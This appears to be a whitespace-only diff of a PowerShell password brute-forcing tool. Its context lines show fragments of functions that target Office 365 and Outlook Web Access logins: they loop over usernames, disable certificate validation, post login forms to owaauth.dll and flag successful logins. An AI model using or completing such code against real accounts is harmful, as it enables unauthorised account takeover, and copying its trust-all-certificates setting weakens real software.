@@ -43,9 +43,9 @@ function Brute-365 {
           [console]::beep(2000,500)
         }
       }
-    } 
-  } 
-} 
+    }
+  }
+}
   function Brute-OWA  {
       <#
     .SYNOPSIS
@@ -98,8 +98,8 @@ function Brute-365 {
     foreach($user in $usernames) {
       $username = $($user.Username)
       write-host "here" $username
-    } 
-  } 
+    }
+  }
   $Username = $Domain + "\" + $Username
 
   try {
@@ -120,8 +120,8 @@ function Brute-365 {
   [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 
   #Initialize Stop Watch to calculate the latency.
- 
-    
+
+
     Write-Output $username
     #Invoke the login page
     $Response = Invoke-WebRequest -Uri $URL -SessionVariable owa
@@ -135,7 +135,7 @@ function Brute-365 {
     $authpath = "$URL/auth/owaauth.dll"
     #Login to OWA
     $Response = Invoke-WebRequest -Uri $authpath -WebSession $owa -Method POST -Body $Form.Fields
-    #SuccessfulLogin 
+    #SuccessfulLogin
     if ($Response.forms[0].id -eq "frm") {
       #Retrieve Status Code
       $StatusCode = $Response.StatusCode
@@ -185,4 +185,4 @@ function Brute-365 {
           [console]::beep(2000,500)
         }
   }
-} 
+}
